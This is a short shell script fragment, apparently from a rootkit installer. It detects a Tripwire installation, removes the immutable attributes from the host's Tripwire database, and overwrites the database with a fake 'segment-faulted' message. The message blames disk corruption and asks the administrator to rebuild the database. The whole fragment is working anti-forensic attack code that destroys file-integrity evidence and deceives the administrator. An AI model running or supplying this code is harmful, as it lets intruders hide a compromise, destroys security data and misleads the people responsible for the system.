echo -n "${DCYN}[${WHI}sh${DCYN}]# checking for tripwire... ${RES}"

uname=`uname -n`
twd=/var/lib/tripwire/$uname.twd

if [ -d /var/lib/tripwire ]; then
echo "${WHI} ALERT: TRIPWIRE FOUND! ${RES}"

if [ -f /var/lib/tripwire/$uname.twd ]; then
chattr -isa $twd
echo -n "${DCYN}[${WHI}sh${DCYN}]# checking for tripwire-database... ${RES}"
echo "${RED} ALERT! tripwire database found ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# ${WHI} dun worry we got handy-tricks for this :) ${RES}"
echo "-----------------------------------------" > $twd
echo "Tripwire segment-faulted !" >> $twd
echo "-----------------------------------------" >> $twd
echo "" >> $twd
echo "The reasons for this may be: " >> $twd
echo "" >> $twd
echo "corrupted disc-geometry, possible bad disc-sectors" >> $twd
echo "corrupted files while checking for possible change etc." >> $twd
echo ""
echo "pls. rerun tripwire to build the database again!" >> $twd
echo "" >> $twd
else
echo "${WHI} lucky you: Tripwire database not found. ${RES}"
fi
else
echo "${WHI} guess not. ${RES}"
fi